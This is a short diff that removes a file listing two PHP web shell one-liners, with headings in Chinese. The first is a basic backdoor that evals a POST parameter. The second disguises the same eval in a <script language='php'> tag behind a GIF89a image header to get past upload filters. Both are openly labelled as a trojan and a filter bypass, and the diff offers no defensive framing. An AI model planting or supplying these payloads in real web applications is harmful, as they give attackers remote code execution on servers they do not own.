@@ -1,5 +1,0 @@
-1. 基础php一句话木马:
-<?php @eval($_POST['pass']);?>
-
-2. 规避<?php ?>:
-GIF89a? <script language="php">eval($_REQUEST[123])</script>
